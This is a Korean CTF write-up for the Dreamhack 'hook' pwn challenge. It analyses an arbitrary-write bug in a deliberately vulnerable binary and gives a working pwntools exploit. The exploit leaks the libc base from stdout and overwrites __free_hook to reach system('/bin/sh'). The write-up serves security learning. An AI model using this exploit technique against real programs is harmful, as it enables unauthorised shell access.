# hook - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: hook.c, hook(ELF), libc-2.23.so
- tools:
## Brief Description
이 문제는 작동하고 있는 서비스(hook)의 바이너리와 소스코드가 주어집니다.
프로그램의 취약점을 찾고 _hook Overwrite 공격 기법으로 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec hook
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```
## Vulnerability
### Arbitrary Write(임의 주소 쓰기)
``` c
*(long *)*ptr = *(ptr+1);
// *(long *)ptr[0] = ptr[1]
```
ptr[0]에 적힌(가리키는) 주소에 ptr[1]의 값을 쓰는 것으로, 공격자가 임의 주소에 값을 삽입할 수 있다.  
## Exploit
### Strategy
카나리가 설정되어 있지만, BOF를 활용하지 않아서 상관 없다. Full RELRO가 활성화되어 `.got`, `.got.plt`를 덮어 쓸 수 없지만, `__free_hook`은 덮어쓸 수 있다. `__free_hook`를 덮어써서 더블 free를 막으면 `system("/bin/sh");`을 실행할 수 있다. 그 외에도 one_gadget을 사용하거나, `__free_hook`을 `system("/bin/sh");`처럼 덮어쓰는 방법도 있다.  
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| canary | -0x8 |
| ptr | -x10 |
| size | -0x18 |
### Exploitation Steps
``` sh
pwndbg> break* (main+35)
pwndbg> ni
pwndbg> ni
```
``` sh
*RAX  0x7ffff7fa6780 (_IO_2_1_stdout_) ◂— 0xfbad2087
```
`stdout`은 libc의 `_IO_2_1_stdout_`를 가리키는 것을 확인할 수 있다. 이것으로 libc base를 구할 수 있다.  
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 19972)
context.arch = "amd64"

e = ELF('./hook')
libc = ELF('x64/libc-2.23.so')

# recv stdout
p.recvuntil(b'stdout: ')
stdout = int(p.recvline(), 16)

# libc base leak
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
log.info(f'libc base = {libc_base}')
free_hook = libc_base + libc.symbols['__free_hook']
puts = libc_base + libc.symbols['puts']

# send size
p.recvuntil(b'Size: ')
p.sendline(b'16')

# payload
payload = b''
payload += p64(free_hook) + p64(puts)
p.sendlineafter(b'Data: ', payload)

# interactive
p.interactive()
```